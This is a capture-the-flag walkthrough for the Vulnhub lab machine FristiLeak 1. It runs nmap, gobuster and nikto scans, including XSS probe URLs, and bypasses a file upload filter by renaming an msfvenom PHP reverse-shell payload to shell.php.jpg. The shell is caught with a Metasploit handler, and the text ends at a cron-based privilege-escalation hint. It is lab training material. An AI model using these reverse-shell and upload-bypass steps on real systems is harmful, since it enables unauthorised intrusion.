# Walkthrough for Machine "FristiLeak 1" on Vulnhub

NMAP Basic Scan 

```shell
root@kali:~# nmap 192.168.1.115

Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-27 13:10 +04
Nmap scan report for 192.168.1.115
Host is up (0.00015s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 6.00 seconds
```

NMAP Aggressive Scan 

```shell
root@kali:~# nmap -A -O -sV -p80 192.168.1.115

Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-27 13:11 +04
Nmap scan report for 192.168.1.115
Host is up (0.00015s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.15 ms 192.168.1.115

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.89 seconds
```
Lets Do Dir Busting 

```shell
root@kali:~# gobuster -u http://192.168.1.130 -w Desktop/SecList/SecLists/Discovery/Web_Content/big.txt -s '200,204,301,302,307,403,500' -e

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.1.130/
[+] Threads      : 10
[+] Wordlist     : Desktop/SecList/SecLists/Discovery/Web_Content/big.txt
[+] Status codes : 204,301,302,307,403,500,200
[+] Expanded     : true
=====================================================
http://192.168.1.130/.htaccess (Status: 403)
http://192.168.1.130/.htpasswd (Status: 403)
http://192.168.1.130/beer (Status: 301)
http://192.168.1.130/cgi-bin/ (Status: 403)
http://192.168.1.130/images (Status: 301)
http://192.168.1.130/robots.txt (Status: 200)
=====================================================
```

Go Buster Showed **CGI** Lets Do Scan For it 

```shell
root@kali:~# gobuster -u http://192.168.1.130 -w Desktop/SecList/SecLists/Discovery/Web_Content/cgis.txt -s '200,204,403,500' -e

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.1.130/
[+] Threads      : 10
[+] Wordlist     : Desktop/SecList/SecLists/Discovery/Web_Content/cgis.txt
[+] Status codes : 200,204,403,500
[+] Expanded     : true
=====================================================
http://192.168.1.130/./ (Status: 200)
http://192.168.1.130/?mod=node&nid=some_thing&op=view (Status: 200)
http://192.168.1.130/?mod=some_thing&op=browse (Status: 200)
http://192.168.1.130/error/HTTP_NOT_FOUND.html.var (Status: 200)
http://192.168.1.130// (Status: 200)
http://192.168.1.130/?Open (Status: 200)
http://192.168.1.130/?OpenServer (Status: 200)
http://192.168.1.130/%2e/ (Status: 200)
http://192.168.1.130/?mod=<script>alert(document.cookie)</script>&op=browse (Status: 200)
http://192.168.1.130/?sql_debug=1 (Status: 200)
http://192.168.1.130/// (Status: 200)
http://192.168.1.130/cgi-bin/ (Status: 403)
http://192.168.1.130/?PageServices (Status: 200)
http://192.168.1.130/?wp-cs-dump (Status: 200)
http://192.168.1.130/cgi-bin/.htaccess (Status: 403)
http://192.168.1.130/cgi-bin/.htaccess.old (Status: 403)
http://192.168.1.130/cgi-bin/.htaccess.save (Status: 403)
http://192.168.1.130/cgi-bin/.htaccess~ (Status: 403)
http://192.168.1.130/cgi-bin/.htpasswd (Status: 403)
http://192.168.1.130/.htpasswd (Status: 403)
http://192.168.1.130/.htaccess (Status: 403)
http://192.168.1.130//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// (Status: 200)
http://192.168.1.130/images/ (Status: 200)
http://192.168.1.130/?pattern=/etc/*&sort=name (Status: 200)
http://192.168.1.130/images/?pattern=/etc/*&sort=name (Status: 200)
http://192.168.1.130/icons/ (Status: 200)
http://192.168.1.130/?D=A (Status: 200)
http://192.168.1.130/?N=D (Status: 200)
http://192.168.1.130/?S=A (Status: 200)
http://192.168.1.130/?M=A (Status: 200)
http://192.168.1.130/?\"><script>alert('Vulnerable');</script> (Status: 200)
=====================================================
```

Nikto Scan 

```shell
root@kali:~# nikto -host 192.168.1.130
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.130
+ Target Hostname:    192.168.1.130
+ Target Port:        80
+ Start Time:         2017-07-28 18:47:31 (GMT4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+ Server leaks inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 22:45:47 2015
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Entry '/cola/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/sisi/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/beer/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 3 entries which should be manually viewed.
+ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ PHP/5.3.3 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8348 requests: 0 error(s) and 16 item(s) reported on remote host
+ End Time:           2017-07-28 18:47:41 (GMT4) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

ROBOTS.txt 

```plain
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
```
Since none of the Directories worked out lets try **fristi** as dir 

Bingo we are in but we need a Username and Password

Not Lets Check the Source Code we have these 2 Comments

```html
<!-- 
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

- by eezeepz
-->
```
We Know that there is someone called **eezeepz**

This Comment is Base64 encoded if we decode it we will get this string **keKkeKKeKKeKkEkkEk**

```html
<!-- 
iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
U5ErkJggg==
-->
```

Bingo we are in Postion to upload a Shell *but* the shell has to be in **jpg,gif,png** format 

Now Creating PHP/Reverse_PHP Shell 

```shell
root@kali:~/Desktop/Vulnhub VMs/exploits# msfvenom -p php/reverse_php LHOST=192.168.1.129 LPORT=4444 -f raw > shell.php
No platform was selected, choosing Msf::Module::Platform::PHP from the payload
No Arch selected, selecting Arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 3011 bytes
```

Rename the Shell to add JPG Extension

```shell
root@kali:~/Desktop/Vulnhub VMs/exploits# cp shell.php shell.php.jpg
```
Lets now go this URL **http://192.168.1.130/fristi/uploads/shell.php.jpg**

and open **msfconsole**

```shell
msf> use exploit/multi/handler

msf exploit(handler) > show options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (php/reverse_php):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.129    yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target 
```

Lets Run the Handler and refresh the link 

```shell
msf exploit(handler) > run

[*] Started reverse TCP handler on 192.168.1.129:4444 
[*] Starting the payload handler...
[*] Command shell session 4 opened (192.168.1.129:4444 -> 192.168.1.130:58593) at 2017-07-28 18:59:17 +0400
```

Lets SPAWN TTY Shell 
```
```
Searching the the Files there is **notes.txt**

```plain
Yo EZ,

I made it possible for you to do some automated checks, 
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my 
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The 
output goes to the file "cronresult" in /tmp/. It should 
run every minute with my account privileges.

- Jerry
```
